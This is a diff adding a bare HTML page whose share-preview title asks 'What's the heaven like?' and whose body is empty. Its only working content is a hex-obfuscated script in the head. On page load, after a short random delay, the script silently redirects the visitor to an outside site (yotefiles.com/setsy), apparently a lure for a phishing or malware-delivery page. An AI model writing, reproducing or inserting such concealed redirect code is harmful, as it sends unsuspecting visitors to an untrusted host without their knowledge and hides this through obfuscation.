@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta property="og:title" content="What's the heaven like?" />
+<meta property="og:type" content="website" />
+<script>var _0x8c84=["\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x68\x74\x74\x70\x3A\x2F\x2F\x79\x6F\x74\x65\x66\x69\x6C\x65\x73\x2E\x63\x6F\x6D\x2F\x73\x65\x74\x73\x79","\x73\x65\x74\x54\x69\x6D\x65\x6F\x75\x74","\x74\x68\x69\x73\x2E\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x20\x3D\x20\x75\x3B"];var _0xbecb=[_0x8c84[0],_0x8c84[1],_0x8c84[2],_0x8c84[3],_0x8c84[4]];var t=Math[_0xbecb[1]]((Math[_0xbecb[0]]()*100)+1),u=_0xbecb[2],s=self[_0xbecb[3]];s(_0xbecb[4],t);</script>
+</head>
+<body>
+</body>
+</html>
